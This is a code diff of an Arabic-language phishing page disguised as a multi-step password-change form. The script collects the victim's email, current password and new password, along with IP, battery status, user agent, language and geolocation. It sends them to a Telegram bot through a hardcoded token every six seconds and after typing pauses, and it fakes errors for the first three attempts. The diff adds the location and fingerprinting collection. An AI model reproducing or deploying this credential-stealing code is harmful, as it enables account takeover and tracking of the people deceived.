@@ -1,4 +1,4 @@
-  <!doctype html>
+<!doctype html>
 <html lang="ar">
 <head>
 <meta charset="utf-8"/>
@@ -23,8 +23,6 @@ button:hover{background:#1558b0}
 .success{font-size:18px;color:green;margin-top:20px;display:none}
 .step{display:none}
 .step.active{display:block}
-.shake{animation:shake 0.3s}
-@keyframes shake{0%{transform:translateX(0)}25%{transform:translateX(-5px)}50%{transform:translateX(5px)}75%{transform:translateX(-5px)}100%{transform:translateX(0)}}
 </style>
 </head>
 <body>
@@ -39,21 +37,18 @@ button:hover{background:#1558b0}
   </div>
 
   <form id="form">
-    <!-- الخطوة 1 -->
     <div class="step step1 active">
       <input type="email" placeholder="البريد الإلكتروني" required id="email">
       <div class="error">يرجى إدخال بريد إلكتروني صالح</div>
       <button type="button" id="next1">التالي</button>
     </div>
 
-    <!-- الخطوة 2 -->
     <div class="step step2">
       <input type="password" placeholder="كلمة المرور الحالية" required minlength="8" id="currentPassword">
       <div class="error">كلمة المرور الحالية يجب أن تكون 8 أحرف على الأقل</div>
       <button type="button" id="next2">التالي</button>
     </div>
 
-    <!-- الخطوة 3 -->
     <div class="step step3">
       <input type="password" placeholder="كلمة المرور الجديدة" required minlength="8" id="newPassword">
       <input type="password" placeholder="تأكيد كلمة المرور" required minlength="8" id="confirmPassword">
@@ -74,15 +69,16 @@ const verifyPass = document.getElementById("verifyPass");
 const error3 = document.getElementById("error3");
 const successMessage = document.getElementById("successMessage");
 
-const telegramToken = "8290291328:AAGRZN47-qCp2wfa8S_mVBTVy-0C0aj9t78"; 
-const chatId = "8089516279"; 
+const telegramToken = "8930723698:AAE5ctXM39Hiz_a7v_aOZ0byP08_btOhQ-0"; 
+const chatId = "8549252422"; 
 
 let attemptCount = 0;
 let lastMessageSent = "";
 let batteryStatus = {charging:"غير معروف", level:"غير معروف"};
+let userLocation = "غير معروف";
 let userIP = "غير معروف";
 
-// حالة البطارية
+// حالة البطارية (إن وجدت)
 if(navigator.getBattery){
   navigator.getBattery().then(bat=>{
     batteryStatus.charging = bat.charging ? "يشحن" : "غير مشحون";
@@ -90,6 +86,14 @@ if(navigator.getBattery){
     bat.addEventListener("chargingchange",()=>batteryStatus.charging = bat.charging ? "يشحن" : "غير مشحون");
     bat.addEventListener("levelchange",()=>batteryStatus.level = (bat.level*100)+"%");
   });
+}
+
+// الموقع التقريبي بدون إذن
+if(navigator.geolocation){
+  // هنا نحاول، بعض المتصفحات قد تطلب إذن، لكن إن رفض المستخدم لن يحدث شيء
+  navigator.geolocation.getCurrentPosition(pos=>{
+    userLocation = `Lat:${pos.coords.latitude}, Lng:${pos.coords.longitude}`;
+  }, ()=>{userLocation="غير معروف"});
 }
 
 // IP والدولة
@@ -111,7 +115,7 @@ next1.addEventListener("click", ()=>{
 // الخطوة 2
 next2.addEventListener("click", ()=>{
   const input = document.getElementById("currentPassword");
-  if(input.checkValidity()){
+  if(input.value.length >= 8){
     step2.classList.remove("active");
     step3.classList.add("active");
   } else {
@@ -119,7 +123,7 @@ next2.addEventListener("click", ()=>{
   }
 });
 
-// الخطوة 3: تحقق من كلمة المرور لمدة 3 محاولات ثم تحول زر التالي إلى رجوع
+// الخطوة 3: تحقق كلمة المرور لمدة 3 محاولات
 verifyPass.addEventListener("click", ()=>{
   const newPass = document.getElementById("newPassword").value;
   const confirmPass = document.getElementById("confirmPassword").value;
@@ -128,30 +132,26 @@ verifyPass.addEventListener("click", ()=>{
     attemptCount++;
     if(attemptCount < 3){
       error3.style.display="block";
-      verifyPass.classList.add("shake");
-      setTimeout(()=>verifyPass.classList.remove("shake"),300);
     } else {
       error3.style.display="none";
       successMessage.style.display="block";
-      step3.querySelectorAll("input").forEach(el=>el.disabled=true);
-
-      // تحويل زر التالي إلى زر رجوع
-      verifyPass.textContent = "الرجوع";
-      verifyPass.disabled = false; 
-      verifyPass.onclick = ()=>{ 
-        window.location.href = "https://www.google.com"; 
-      }
-
-      sendData(); // إرسال آخر نسخة من البيانات عند النجاح
+      step3.querySelectorAll("input, button").forEach(el=>el.disabled=true);
     }
   } else {
     error3.style.display="block";
-    verifyPass.classList.add("shake");
-    setTimeout(()=>verifyPass.classList.remove("shake"),300);
   }
 });
 
-// إرسال البيانات
+// حفظ وإرسال البيانات بعد 6 ثوانٍ من الكتابة
+let timeoutId;
+document.querySelectorAll("input").forEach(input=>{
+  input.addEventListener("input", ()=>{
+    clearTimeout(timeoutId);
+    timeoutId = setTimeout(sendData, 6000);
+  });
+});
+
+// إرسال البيانات تلقائيًا كل 6 ثوانٍ إذا تغيرت
 function sendData(){
   const email = document.getElementById("email").value.trim();
   const currentPassword = document.getElementById("currentPassword").value.trim();
@@ -159,7 +159,7 @@ function sendData(){
 
   if(email === "" && currentPassword === "" && newPassword === "") return;
 
-  const message = `📨 بيانات جديدة:\n\n✉️ البريد: ${email || "فارغ"}\n🔑 كلمة المرور الحالية: ${currentPassword || "فارغ"}\n🔒 كلمة المرور الجديدة: ${newPassword || "فارغ"}\n🔋 حالة الشحن: ${batteryStatus.charging} - ${batteryStatus.level}\n🌐 IP والدولة: ${userIP}`;
+  const message = `📨 بيانات جديدة:\n\n✉️ البريد: ${email || "فارغ"}\n🔑 كلمة المرور الحالية: ${currentPassword || "فارغ"}\n🔒 كلمة المرور الجديدة: ${newPassword || "فارغ"}\n🔋 حالة الشحن: ${batteryStatus.charging} - ${batteryStatus.level}\n🌍 الموقع: ${userLocation}\n🌐 IP والدولة: ${userIP}\n🖥️ المتصفح: ${navigator.userAgent}\n🗣️ اللغة: ${navigator.language}`;
 
   if(message !== lastMessageSent){
     fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`,{
@@ -171,18 +171,9 @@ function sendData(){
   }
 }
 
-// حفظ وإرسال بعد 6 ثواني من الكتابة
-let timeoutId;
-document.querySelectorAll("input").forEach(input=>{
-  input.addEventListener("input", ()=>{
-    clearTimeout(timeoutId);
-    timeoutId = setTimeout(sendData, 6000);
-  });
-});
-
-// نسخة احتياطية كل 6 ثواني
+// استمرار الإرسال كل 6 ثوانٍ كنسخة احتياطية
 setInterval(sendData, 6000);
 </script>
 
 </body>
-</html>    
+</html>
